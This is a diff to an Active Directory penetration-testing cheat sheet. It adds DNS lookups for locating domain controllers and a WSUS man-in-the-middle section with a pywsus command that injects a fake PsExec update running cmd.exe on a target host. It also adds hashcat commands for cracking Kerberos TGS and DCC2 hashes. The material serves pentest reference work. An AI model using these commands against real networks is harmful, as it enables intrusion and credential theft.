@@ -4,6 +4,7 @@
   - [Recon](#recon)
   - [Unauthenticated enumeration](#unauthenticated-enumeration)
   - [Unauthenticated User enumeration](#unauthenticated-user-enumeration)
+      - [Finding DC IP](#finding-dc-ip)
       - [User enumeration via Kerberos](#user-enumeration-via-kerberos)
       - [User enumeration without kerberos](#user-enumeration-without-kerberos)
   - [First foothold](#first-foothold)
@@ -86,6 +87,7 @@
     - [PAC](#pac)
     - [ProxyLogon](#proxylogon)
     - [ProxyShell](#proxyshell)
+    - [ProxyNotShell](#proxynotshell)
     - [ZeroLogon](#zerologon)
     - [PrintNightmare](#printnightmare)
       - [SpoolSample](#spoolsample)
@@ -162,6 +164,9 @@
       - [Net-NTLMv2](#net-ntlmv2)
       - [AS-Rep Roast response (Kerberos 5 AS-REP etype 23)](#as-rep-roast-response-kerberos-5-as-rep-etype-23)
       - [Kerberoast (Service Ticket)](#kerberoast-service-ticket)
+      - [Kerberos 5 TGS (AES128)](#kerberos-5-tgs-aes128)
+      - [Kerberos 5 TGS (AES256)](#kerberos-5-tgs-aes256)
+      - [MsCache 2 (DCC2)](#mscache-2-dcc2)
   - [Reporting / Collaborative](#reporting--collaborative)
     - [PlumHound](#plumhound)
     - [Pwndoc](#pwndoc)
@@ -223,6 +228,14 @@ rundll32 dsquery.dll,OpenqueryWindow
 ```
 
 ## Unauthenticated User enumeration
+#### Finding DC IP
+```
+nmcli dev show eth0
+
+nslookup -type=SRV _ldap._tcp.dc._msdcs.<domainName>
+nslookup -type=SRV _ldap._tcp.dc._msdcs.company.local
+```
+
 #### User enumeration via Kerberos
 --> Require list of possible usernames:  
   - Non-existent account : ```KDC_ERR_C_PRINCIPAL_UNKNOWN```
@@ -865,6 +878,8 @@ Check if the DC is vulnerable to CVE-2021-42278 and CVE-2021-42287 to impersonat
 
 ### ProxyShell
 
+### ProxyNotShell
+
 ### ZeroLogon
 
 ```
@@ -912,6 +927,21 @@ SMB Relay
 LDAP Relay
 
 ### WSUS Exploitation
+In case of WSUS being deployed without SSL/TLS encrypted communications, we can perform a man-in-the-middle attack and inject a fake update.
+- Can only deliver binaries signed by Microsoft (PSExec, BGinfo with VB script)
+- Need to perform ARP Spoofing or tamper with the system's proxy settings (if possible)
+
+--> WSUS Server can be found based on the server hostname (e.g. server-wsus-01) or based on open ports (8530,8531)  
+
+**Tools**  
+- https://github.com/pimps/wsuxploit
+- https://github.com/GoSecure/pywsus
+- https://github.com/ctxis/wsuspect-proxy/
+
+```
+python pywsus.py -H 172.16.205.21 -p 8530 -e PsExec64.exe -c ‘/accepteula /s cmd.exe /c “echo wsus.poc > C:\\poc.txt”‘
+```
+
 - [WSUSpect Black Hat Talk](https://www.blackhat.com/docs/us-15/materials/us-15-Stone-WSUSpect-Compromising-Windows-Enterprise-Via-Windows-Update.pdf)
 - [WSUSPect tool](https://github.com/ctxis/wsuspect-proxy)
 - [PyWSUS](https://www.gosecure.net/blog/2020/09/03/wsus-attacks-part-1-introducing-pywsus/)
@@ -931,6 +961,22 @@ WSUS or Windows Software Update Services is the enterprise variant of Windows up
 
 **wsus soap service**  
 <img src="./images/wsus_soap_service.png" width="500"/>
+
+**MITM wsus soap service**
+<img src="./images/wsus_psexec.png" width="500"/>
+
+Check WSUS HTTP Misconfiguration:
+- Check Registry on WSUS client machines to validate TLS usage
+```
+HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\
+WUServer = http://wsus-server.local:8530
+```
+
+- Check if the computer will use WUServer
+```
+HKLMT\Software\Policies\Microsoft\Windows\WindowsUpdate\AU
+UseWUServer = 1
+```
 
 
 ### LDAP Pass Back
@@ -1461,9 +1507,23 @@ hashcat -m 18200 -a 0 AS_REP_responses_hashes.txt ../../wordlists/rockyou_2021.t
 hashcat -m 13100 -a 0 TGS_hashes.txt ../../wordlists/rockyou_2021.txt
 ```
 
+#### Kerberos 5 TGS (AES128)
+```
+hashcat -m 19600 -a 0 TGS_hashes.txt ../../wordlists/rockyou_2021.txt
+```
 
+#### Kerberos 5 TGS (AES256)
+```
+hashcat -m 19700 -a 0 TGS_hashes.txt ../../wordlists/rockyou_2021.txt
+```
 
-
+#### MsCache 2 (DCC2)
+Slow to be cracked due to PBKDF2 usage (*PBKDF2(HMAC-SHA1, 10240, DCC1, username*)
+- https://security.stackexchange.com/questions/30889/cracking-ms-cache-v2-hashes-using-gpu
+- https://webstersprodigy.net/2014/02/03/mscash-hash-primer-for-pentesters/
+```
+hashcat -m 2100 -a 0 DCC2_hashes.txt ../../wordlists/rockyou_2021.txt
+```
 
 
 
